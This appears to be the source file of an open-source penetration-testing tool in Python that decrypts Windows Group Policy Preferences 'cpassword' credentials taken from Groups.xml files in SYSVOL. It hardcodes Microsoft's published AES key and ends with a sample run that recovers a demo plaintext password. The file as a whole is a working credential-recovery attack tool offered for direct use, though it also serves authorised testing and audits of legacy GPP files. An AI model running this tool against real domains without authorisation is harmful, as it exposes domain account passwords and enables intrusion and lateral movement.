#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Galoget Latorre
# LinkedIn: https://www.linkedin.com/in/galoget/
# Created and Tested in:
# - Python 3.10.4
# - pip 22.1.1
#
# Validated with:
# - pylint 2.12.2
# - astroid 2.9.3
# - Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0]

"""

GPP CPass Decryption Tool (Python 3 Implementation)

  - Python 3 tool that decrypts credentials stored in Group Policy
    Preferences (GPP) files (Groups.xml) located in the SYSVOL folder.

  - More features to come...

"""

# Standard Modules
# System Operations Module
import sys

# Argument Parser Module
import argparse

# Base64 Encoding/Decoding Module
import base64

# Crypto Modules
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Coloring Module
from colorama import Fore, Style

# Package Info
__author__  = "Galoget Latorre"
__version__ = "0.0.1"
__github__  = "https://github.com/galoget/gpp-cpass-decrypt"
__license__ = "License GPL version 2.0 <http://www.gnu.org/licenses/old-licenses/gpl-2.0.html>"


def banner():
    """
    Function to print the banner of the program
    No input arguments, no return
    """

    print("                                                                       ")
    print("   ██████╗ ██████╗ ██████╗      ██████╗██████╗  █████╗ ███████╗███████╗")
    print("  ██╔════╝ ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝")
    print("  ██║  ███╗██████╔╝██████╔╝    ██║     ██████╔╝███████║███████╗███████╗")
    print("  ██║   ██║██╔═══╝ ██╔═══╝     ██║     ██╔═══╝ ██╔══██║╚════██║╚════██║")
    print("  ╚██████╔╝██║     ██║         ╚██████╗██║     ██║  ██║███████║███████║")
    print("   ╚═════╝ ╚═╝     ╚═╝          ╚═════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝")
    print("                                                                       ")
    print("             ██████╗ ███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗")
    print("             ██╔══██╗██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝")
    print("             ██║  ██║█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ")
    print("             ██║  ██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ")
    print("             ██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║        ██║   ")
    print("             ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ")
    print("                                                                       ")
    print("                  Author: Galoget Latorre - @galoget                   ")
    print("                                                                       ")


def main():
    """
    Main Function of the program
    No input arguments, no return
    """

    # Print the banner
    banner()

    # Added Program Description and Version Info
    parser = argparse.ArgumentParser(description="""GPP CPassword Decryption Tool. 
                                     Python 3 tool that decrypts credentials stored
                                     in Group Policy Preferences (GPP) files
                                     (Groups.xml) located in the SYSVOL folder""")

    parser.version = """GPP CPassword Decryption Tool 0.0.1
                        - Author: Galoget Latorre - @galoget"""

    # Added --version argument to print info about the program
    parser.add_argument('--version', action='version')

    # Added -c / --cpassword argument to enter the Base64 encoded cpassword to the tool
    parser.add_argument('-c', '--cpassword',
                        nargs=1,
                        type=str,
                        metavar='cpassword',
                        required=True,
                        help='Base64 encoded cpassword to decrypt')

    args = parser.parse_args()

    # Colored symbols for success, error and info messages
    plus_sign = Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE + "]" + Fore.GREEN
    minus_sign = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Fore.RED
    info_sign = Fore.WHITE + "[" + Fore.BLUE + "!" + Fore.WHITE + "]" + Fore.BLUE

    try:
        # Reads the argument passed by the user and calls the decryption function
        encrypted_password = args.cpassword[0]
        print(f" {info_sign}  Entered Password: "
               + Style.RESET_ALL + f"{encrypted_password}")
        decrypted_password = decrypt(encrypted_password)
        print(f" {plus_sign}  Decrypted Password: "
               + Style.RESET_ALL + f"{decrypted_password}")

    # If the user press CTRL + C
    except KeyboardInterrupt:
        print(" You pressed CTRL + C.\nExiting..." + Style.RESET_ALL)
        sys.exit()

    # In case any other errors occurs
    except:
        print(f" {minus_sign}  Error while decrypting cPassword, "
               "please check your input." + Style.RESET_ALL)

        print(f" {info_sign}  Exiting..." + Style.RESET_ALL)
        sys.exit()


def decrypt(base64_encoded_gpp_cpassword):
    """

    Function that decrypts the GPP Cpassword encoded in Base64

        Input: Base64 encoded string GPP CPassword
        Sample Input: VPe/o9YRyz2cksnYRbNeQpxQIjMB/W4+CjQJosyeQls)

        Output [Return]: Decrypted plaintext password string
        Sample Output [Return]: Password3

    """

    # Set initial parameters for the cipher (AES)
    initialization_vector = 16 * b'\x00'
    ciphertext = base64.b64decode(base64_encoded_gpp_cpassword + "=" * 3)

    # Default 32-byte AES Key
    key_hex = '4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
    key = bytes.fromhex(key_hex)
    # Reference:
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be

    cipher = AES.new(key, AES.MODE_CBC, initialization_vector)

    # Decrypt the password
    decrypted = cipher.decrypt(ciphertext)

    # Assumes input is padded and size block is 32
    unpadded = unpad(decrypted, 32)
    plaintext = unpadded.decode('utf-8').replace('\x00', '')

    # Return plaintext password as string
    return plaintext


if __name__ == '__main__':
    # Calls the main function
    main()

"""
Example of Execution:
┌──(venv)─(galoget㉿hackem)-[~/gpp-cpass-decrypt]
└─$ python3 gpp_cpass_decrypt.py -c "gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+SwIyQbAetjEUfqBg2HmTklEXlDHuQPgE3NyuCKZ9Nu3oeXaeSt+9JQ=="

   ██████╗ ██████╗ ██████╗      ██████╗██████╗  █████╗ ███████╗███████╗
  ██╔════╝ ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║  ███╗██████╔╝██████╔╝    ██║     ██████╔╝███████║███████╗███████╗
  ██║   ██║██╔═══╝ ██╔═══╝     ██║     ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚██████╔╝██║     ██║         ╚██████╗██║     ██║  ██║███████║███████║
   ╚═════╝ ╚═╝     ╚═╝          ╚═════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                       
             ██████╗ ███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
             ██╔══██╗██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
             ██║  ██║█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
             ██║  ██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
             ██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║        ██║   
             ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   
                                                                       
                  Author: Galoget Latorre - @galoget                   
                                                                       
 [!]  Entered Password: gtTqxKHj4RWsxHWcZcWtM8j7XbxiL7w+SwIyQbAetjEUfqBg2HmTklEXlDHuQPgE3NyuCKZ9Nu3oeXaeSt+9JQ==
 [+]  Decrypted Password: Hackem Cybersecurity Research Group

"""
